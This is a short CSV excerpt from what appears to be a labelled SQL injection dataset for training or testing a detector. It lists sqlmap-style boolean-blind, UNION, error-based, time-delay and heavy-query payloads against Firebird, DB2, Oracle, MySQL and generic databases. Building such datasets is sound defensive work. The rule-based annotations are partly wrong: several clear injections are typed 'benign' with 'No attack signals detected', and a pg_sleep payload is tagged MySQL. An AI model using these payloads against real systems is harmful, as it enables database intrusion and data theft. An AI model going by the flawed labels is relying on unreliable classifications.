row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
10080,-5708 where 3134 = 3134 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1,,boolean_blind,firebird,0.95,3134 = 3134 or detected — boolean_blind injection (priority 8) on firebird,rule-based
10081,"1 ) and make_set ( 8403 = 8403,8899 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10082,"-7869%' union all select 2406,2406,2406,2406,2406,2406,2406,2406#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10083,"1"" ) ) as xbhp where 7527 = 7527",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10084,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""eaqk"" = ""eaqk",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
10085,-2783%' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( '%' = ',1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
10086,"-4135' ) ) ) union all select 4413,4413,4413#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10087,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( '%' = '",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
10088,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( 'pags' = 'pags,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10089,"1'+ ( select kgon where 9014 = 9014 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) ) +'",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10090,select pg_sleep ( 5 ) and 'qfaz' like 'qfaz,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10091,1 ) as ptxw where 9873 = 9873,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10092,"1%"" ) union all select null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10093,"-2430' ) union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10094,1'|| ( select 'jslz' where 8405 = 8405 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) ) ||',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10095,"1 ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 7244 = 7244",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
10096,1 ) ) ) and 4595 = 4595#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
